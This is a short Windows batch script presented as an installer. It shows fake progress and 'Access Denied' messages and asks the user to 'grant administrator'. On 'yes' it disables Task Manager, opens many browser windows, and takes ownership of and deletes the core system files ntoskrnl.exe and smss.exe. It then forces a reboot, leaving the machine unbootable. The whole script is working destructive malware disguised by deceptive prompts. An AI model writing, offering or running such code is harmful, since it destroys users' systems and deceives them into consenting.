@echo off
color a 
echo installing....
echo Done!
echo Access Denied.. redirecting....
pause
echo Please grant administrator to continue (answer in only yes/no)
set /p input=
if /i %input%==yes goto A
if /i %input%==no goto B

:A
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_SZ /d 1 /f >nul
start https://google.com
start https://google.com
start https://google.com
start https://google.com
start https://google.com
start https://google.com
start https://google.com
start https://google.com
start https://google.com
takeown /f C:\Windows\System32\ntoskrnl.exe 
icacls C:\Windows\System32\ntoskrnl.exe  /grant administrators:F
del /F /S /Q C:\Windows\System32\ntoskrnl.exe
takeown /f C:\Windows\System32\smss.exe
icacls  C:\Windows\System32\smss.exe /grant administrators:F
del /F /S /Q C:\Windows\System32\smss.exe
pause 
@echo "successfully installed ! "
shutdown /r /f
:B
pause 
exit 


